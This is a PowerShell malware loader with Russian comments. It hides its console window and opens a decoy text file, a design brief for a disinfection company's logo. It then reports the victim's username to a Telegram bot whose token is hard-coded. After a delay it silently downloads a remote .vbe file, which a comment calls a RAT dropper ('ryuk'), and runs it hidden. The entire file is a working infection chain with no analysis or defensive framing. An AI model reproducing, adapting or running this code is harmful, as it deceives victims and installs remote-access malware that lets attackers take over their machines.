# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "МСД 2026.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
ТЗ — Новый логотип для службы дезинфекции МСД

Возможные цвета:
- Голубой и белый
- Бирюзовый, тёмно‑серый и белый
- Мятно‑зелёный, тёмно‑синий и белый

Варианты дизайна:
1. Щит с буквами МСД и рисунком распылителя.
2. Капля с крестом или плюсом внутри. Текст – рядом.
3. Монограмма MSD в виде распылителя или маски.
4. Круглый знак с волнами, символизирующими обработку. Текст тоже нужен.
5. Простой рисунок защитного костюма или маски в щите или прямоугольнике.
6. Схематичное изображение молекулы с точкой распыления в центре. Текст – справа.

Дополняющая информация:

Цель проекта
Обновить логотип так, чтобы он отражал профессионализм, надёжность и сферу деятельности (дезинфекция), сохранив узнаваемость бренда.

Требования к версиям логотипа
- Основная цветная версия.
- Инвертированная версия (для тёмного фона).
- Монохромная версия (чёрно‑белая).
- Упрощённый знак для иконок и фавиконов.
- Горизонтальная и вертикальная компоновки.
- Минимальная зона отчуждения и минимальный размер должны быть определены в макете.

Технические требования
- Все элементы в векторе; текстовые элементы оставлять редактируемыми до финализации.
- Рекомендации по применению: примеры на светлом и тёмном фоне, правила размещения на фото и паттернах.

Файлы на выходе
- Исходники в векторе (AI и/или SVG) с редактируемыми слоями.
- PDF для печати (включая версию с обрезными метками).
- PNG с прозрачным фоном в нескольких размерах; JPG для превью.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit